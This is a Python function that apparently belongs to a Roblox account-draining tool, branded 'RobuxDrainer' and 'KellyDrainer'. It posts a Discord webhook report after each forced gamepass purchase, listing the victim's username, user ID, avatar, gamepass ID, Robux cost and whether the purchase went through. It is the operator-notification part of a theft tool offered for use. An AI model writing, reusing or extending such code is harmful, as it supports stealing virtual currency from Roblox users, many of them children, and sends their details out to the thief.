from datetime import datetime
import requests

def send_discord_webhook(webhook, username, user_id, gaid, cost, status_code, status_json, headshot_trash, userid):
    avatar_api_url = f"https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={user_id}&size=150x150&format=Png&isCircular=false"
    
    final_img = "https://static.wikia.nocookie.net/roblox/images/6/66/Content_Deleted.png"
    
    try:
        response = requests.get(avatar_api_url).json()
        if "data" in response and len(response["data"]) > 0:
            final_img = response["data"][0]["imageUrl"]
    except Exception as e:
        print(f"Ошибка при получении аватарки: {e}")

    if isinstance(status_json, dict):
        p = status_json.get("purchased")
        status_text = "✅ Success" if p else "❌ Failed"
        reason = status_json.get("reason", "None")
    else:
        status_text = f"Code: {status_code}"
        reason = str(status_json)

    embed = {
        "title": f"@{username} ({user_id})",
        "color": 0xFFFFFF if "Success" in status_text else 0xe74c3c,
        "thumbnail": {"url": str(final_img)}, 
        "fields": [
            {"name": "Gamepass ID", "value": f"`{gaid}`", "inline": True},
            {"name": "Cost", "value": f"**{cost} R$**", "inline": True}
        ],
        "footer": {"text": "KellyDrainer"},
        "timestamp": datetime.utcnow().isoformat()
    }

    data = {
        "content": f"<@{userid}>",
        "username": "RobuxDrainer",
        "embeds": [embed]
    }

    requests.post(webhook, json=data)